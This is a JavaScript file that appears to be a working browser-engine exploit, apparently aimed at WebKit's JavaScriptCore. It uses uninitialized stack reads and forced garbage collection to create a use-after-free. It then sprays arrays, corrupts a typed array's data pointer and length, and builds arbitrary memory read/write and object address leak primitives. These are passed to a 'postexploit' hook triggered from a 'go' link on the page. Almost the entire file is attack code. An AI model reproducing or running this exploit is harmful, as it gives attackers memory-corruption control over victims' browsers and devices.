var _dview;
function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

function zeroFill( number, width )
{
    width -= number.toString().length;
    if ( width > 0 )
    {
        return new Array( width + (/\./.test( number ) ? 2 : 1) ).join( '0' ) + number;
    }
    return number + ""; // always return a string
}

function int64(low,hi) {
    this.low = (low>>>0);
    this.hi = (hi>>>0);
    this.add32inplace = function(val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);
        if (new_lo < this.low) {
            new_hi++;
        }
        this.hi=new_hi;
        this.low=new_lo;
    }
    this.add32 = function(val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);
        if (new_lo < this.low) {
            new_hi++;
        }
        return new int64(new_lo, new_hi);
    }
    this.sub32 = function(val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);
        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }
        return new int64(new_lo, new_hi);
    }
    this.sub32inplace = function(val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);
        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }
        this.hi=new_hi;
        this.low=new_lo;
    }
    this.and32 = function(val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }
    this.and64 = function(vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }
    this.toString = function(val) {
        val = 16; // eh
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);
        if(this.hi == 0) return lo_str;
        else {
            lo_str = zeroFill(lo_str, 8)
        }
        return hi_str+lo_str;
    }
    this.toPacked = function() {
        return {hi: this.hi, low: this.low};
    }
    this.setPacked = function(pck) {
        this.hi=pck.hi;
        this.low=pck.low;
        return this;
    }
    
    return this;
}

var pressure = new Array(400);

var dgc = function() {
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = new Uint32Array(0x10000);
    }
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = 0;
    }
}

var frame_arr = [];
var frame_idx = 0;
var peek_val = 0;

function peek_stack() {
    var ret_val = undefined;
    
    var retno = 0xffff;
    arguments.length = { valueOf:
        function() {
            var _retno = retno;
            retno = 1;
            return _retno;
        }
    };
    var args = arguments;
    (function() {
     (function() {
      (function() {
       ret_val = arguments[0xff00];
       }).apply(null, args);
      }).apply(null, frame_arr);
     }).apply(null, frame_arr);
    peek_val = ret_val;
    return ret_val;
}

function poke_stack(val) {
    frame_arr[frame_idx] = val;
    (function() {
     (function() {
      (function() {
       }).apply(null, frame_arr);
      }).apply(null, frame_arr);
     }).apply(null, frame_arr);
    frame_arr[frame_idx] = "LOL";
}

function go() {
    try {
        for (var i=0; i < 0xffff; i++)
        {
            frame_arr[i] = i;
        }
        frame_idx = 0;
        poke_stack(0);
        if (peek_stack() == undefined) {
            alert ('not vulnerable');
            return;
        }
        // Primitives are peek/poke to stack.
        // Idea is we store a value in a stack frame, then later use uninitialized mem access to retreive it.
        // However, if we trigger a GC run inbetween, it'll detect the object as non-existing, thus allowing UaF.
        
        var later = new Array(0x200);
        for (var i = 0; i < 0x200; i++) later[i] = []; // spray for later
        var cover = new Array(0x200);
        for (var i = 0; i < 0x100; i++) cover[i] = new Array(0); // spray MarkedSpace
        var uaf_target = [];
        for (var i = 0; i < 0x40; i++) uaf_target[i] = 1337;
        for (var i = 0x100; i < 0x200; i++) cover[i] = new Array(0); // spray MarkedSpace
        frame_idx = 0;
        poke_stack(0);
        peek_stack();
        frame_idx = peek_val;
        
        poke_stack(0x4141);
        for (var k=0; k < 8; k++)
            (function(){})();
        peek_stack();
        
        if (peek_val != 0x4141)
        {
            alert('couldnt align to stack');
            return;
        }
        
        poke_stack(uaf_target); // store uaf_target in stack
        uaf_target = 0; // remove reference
        cover = 0; // remove reference
        for (var k=0; k < 8; k++)
            dgc(); // run GC
        peek_stack(); // read stored reference
        uaf_target = peek_val;
        
        for (var i = 0; i < 0x200; i++)
        {
            later[i].length = 0x3f;
            for (var k = 0; k < 0x3f; k++)
            {
                later[i][k] = 1338; // try to overwrite length
            }
        }
        var overlap = 0;
        var lenid = 0;
        if (uaf_target.length == 1338)
        {
            uaf_target.length = 1336;
            for (var i = 0; i < 0x200; i++)
            {
                later[i].length = 0x3f;
                for (var k = 0; k < 0x3f; k++)
                {
                    if (later[i][k] == 1336) {
                        overlap = later[i];
                        lenid = k;
                        break;
                    }
                }
                if (overlap) break;
            }
        }
        if (overlap) {
            var leakobj = {};
            overlap[lenid] = 0x7fffffff; // set butterfly length
            dgc();
            dgc();
            dgc();
            dgc();
            later.length = 0x50000;
            var buf = new ArrayBuffer(0x1000);
            for (var i = 0; i < 0x50000; i++)
            {
                later[i] = new Uint32Array(buf);
            }
            
            var curi = 0;
            var found = 0;
            while (!found) {
                var sv = uaf_target[0x40000 + curi];
                
                uaf_target[0x40000 + curi] = 0x1337;
                for (var i = 0; i < 0x50000; i++)
                {
                    if (later[i] && later[i].byteLength != 0x1000)
                    {
                        uaf_target[0x40000 + curi] = sv;

                        uaf_target[0x40000 + curi - 5] = uaf_target[0x40000 + curi - 2]; // m_baseAddress = prev view
                        
                        /*
                         0-1: vt (?)
                         2: refcount
                         4-5: data pointer
                         6: offset/neuterable
                         8-9: buffer
                         10-11: prev
                         12-13: next
                         14: len
                         */
                        overlap[lenid] = 0; // set butterfly length
                        uaf_target = 0;
                        dgc();
                        dgc();
                        dgc();
                        

                        var smashed = later[i];
                        
                        var vtPtr = new int64(smashed[0], smashed[1]);
                        var origData = new int64(smashed[4], smashed[5]);
                        var locateHelper = new int64(smashed[12], smashed[13]);
                        
                        smashed[4] = smashed[12];
                        smashed[5] = smashed[13];
                        smashed[14] = 0x40;
                        
                        var slave = undefined;
                        for (var k = 0; k < 0x50000; k++)
                        {
                            if (later[k].length == 0x40)
                            {
                                slave = later[k];
                                break;
                            }
                        }
                        
                        if(!slave) throw new Error("couldn't find slave");
                        
                        var smashedButterfly = locateHelper.sub32(0x40000*8);
                        overlap[0] = 0x41454849;
                        
                        while (1)
                        {
                            smashed[4] = smashedButterfly.low;
                            smashed[5] = smashedButterfly.hi;
                            if (slave[0] == 0x41454849) break;
                            smashedButterfly.sub32inplace(8);
                        }
                        
                        smashed[4] = origData.low;
                        smashed[5] = origData.hi;

                        // derive primitives
                        
                        var leakval = function(obj) {
                            smashed[4] = smashedButterfly.low;
                            smashed[5] = smashedButterfly.hi;
                            overlap[0] = obj;
                            var val = new int64(slave[0], slave[1]);
                            slave[0] = 1337;
                            slave[1] = 0xffff0000;
                            smashed[4] = origData.low;
                            smashed[5] = origData.hi;
                            return val;
                        }
                        
                        var createval = function(val) {
                            smashed[4] = smashedButterfly.low;
                            smashed[5] = smashedButterfly.hi;
                            slave[0] = val.low;
                            slave[1] = val.hi;
                            var val = overlap[0];
                            slave[0] = 1337;
                            slave[1] = 0xffff0000;
                            smashed[4] = origData.low;
                            smashed[5] = origData.hi;
                            return val;
                        }
                        
                        var read4 = function(addr) {
                            smashed[4] = addr.low;
                            smashed[5] = addr.hi;
                            var val = slave[0];
                            smashed[4] = origData.low;
                            smashed[5] = origData.hi;
                            return val;
                        }
                        
                        var write4 = function(addr, val) {
                            smashed[4] = addr.low;
                            smashed[5] = addr.hi;
                            slave[0] = val;
                            smashed[4] = origData.low;
                            smashed[5] = origData.hi;
                        }
                        
                        var read8 = function(addr) {
                            smashed[4] = addr.low;
                            smashed[5] = addr.hi;
                            var val = new int64(slave[0],slave[1]);
                            smashed[4] = origData.low;
                            smashed[5] = origData.hi;
                            return val;
                        }
                        
                        var write8 = function(addr, val) {
                            smashed[4] = addr.low;
                            smashed[5] = addr.hi;
                            slave[0] = val.low;
                            slave[1] = val.hi;
                            smashed[4] = origData.low;
                            smashed[5] = origData.hi;
                        }
                        
                        if (createval(leakval(0x1337)) != 0x1337) {
                            throw new Error("invalid leak/create val behaviour");
                        }
                        
                        var test = [1,2,3,4,5,6,7,8];
                        
                        var test_addr = leakval(test);
                        
                        var butterfly_addr = read8(test_addr.add32(8));
                        
                        if (!butterfly_addr || createval(read8(butterfly_addr)) != 1) {
                            throw new Error("broken read primitive");
                        }
                        
                        if (window.postexploit) {
                            window.postexploit({
                                    read4: read4,
                                    read8: read8,
                                    write4: write4,
                                    write8: write8,
                                    leakval: leakval,
                                    createval: createval
                            });
                        }
                        
                        document.getElementById("clck").innerHTML = 'done';

                        return 2;
                    }
                }
                
                uaf_target[0x40000 + curi] = sv;
                
                curi ++;
            }
            alert("done!");
        }
        return 1;
    } catch (e) { alert(e); }
}

window.onload = function () {
    document.getElementById("clck").innerHTML = '<a href="javascript:go()">go</a>';
};
